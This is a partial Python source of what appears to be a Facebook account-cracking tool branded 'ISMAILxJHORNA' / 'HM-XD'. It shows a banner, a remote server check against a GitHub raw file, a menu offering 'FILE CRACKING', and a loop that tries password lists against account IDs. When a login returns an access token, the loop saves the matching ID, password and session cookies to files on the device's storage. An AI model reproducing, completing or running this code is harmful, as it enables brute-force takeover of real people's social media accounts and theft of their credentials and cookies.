...
\x1b[38;5;46m__________________________________________________
 \033[1;31m[\033[1;32m[I]\033[1;31m]\033[1;32m DEVELOPER : ISMAIL 
 \033[1;31m[\033[1;32m[S]\033[1;31m]\033[1;32m DEVELOPER : JHORNA 
 \033[1;31m[\033[1;32m[M]\033[1;31m]\033[1;32m FACEBOOK  : Abdullah Ismail 
 \033[1;31m[\033[1;32m[A]\033[1;31m]\033[1;32m GITHUB    : Ismail290183737
 \033[1;31m[\033[1;32m[I]\033[1;31m]\033[1;32m TOOLS     : RENDOM
 \033[1;31m[\033[1;32m[L]\033[1;31m]\033[1;32m VERSION   : \033[1;31m[V.19]
\033[1;92m══════════════════════════════════════════

\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS ISMAILxJHORNA BRAND\033[;0m\033[1;91m═══>\033[1;92m""")
os.system('clear')
...
try:
	os.system('clear')
	serv = requests.get('https://raw.githubusercontent.com/HM-XD-428/SERVER/main/MAIN-SERV').text
	if "main" in serv:
		os.system('clear')
		__banner___()
...
def main():
   ...
   ## print(f"\033[1;37m[\033[1;92m1\033[1;37m] \033[1;92mFILE CRACKING ")
    ...
    aysha()
    DxH= input('\033[1;37m[\033[1;92m>\033[1;37m] \033[1;92mSELECT : ')
    if DxH in ['4','01','A','a']:
        ___mix___()
    elif DxH in ['1','02','B','b']:
        ___mix___()
    elif DxH in ['2','03','C','c']:
        #  os.system('xdg-open https://www.facebook.com/iam.DxHrashid')
        __ind__()
    elif DxH in ['4','04','D','d']:
        __ind__()
    elif DxH in ['0','00','E','e']:
        exit()
    else:
        print('\n\033[1;91m[x] Choose valid option ... ');DxH()
...
#. os.system("xdg-open https://www.facebook.com/iam.DxHrashid")
  ...
  # os.system('xdg-open https://github.com/Ismail290183737')
    print()
...
#. os.system("xdg-open https://www.facebook.com/iam.DxHrashid")
  ...
  # os.system('xdg-open https://github.com/DxH-212')
...
def ___mixt___(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r\033[1;32m~[\033[1;92mHM-XD\033[1;32m]-[\033[1;32m{loop}\033[1;97m/\033[1;32m{str(len(id))}\033[1;32m]-\033[1;32m[\033[1;32mOK:{len(oks)}\033[1;32m] ');sys.stdout.flush()
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\33[1;92m~[HM-XD-OK] '+ids+' ~ '+pas+'\033[1;92m')
                #. print(f"\r\33[1;36mCOOKIES=[🐼]: {kuki}\33[1;36m")
                oks.append(ids)
                open('/sdcard/HM-XD-OKS.txt','a').write(ids+' | '+pas+'\n')
                open('/sdcard/DxH-COOKIE','a').write(kuki+'\n')
                break
                                ...
                                if ids in oks:pass
                                        ...
                                        print('\r\r\033[1;30m [HM-XD-CP] \033[1;30m'+str(ids)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HM-XD-rnd-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
            else:continue
        loop+=1
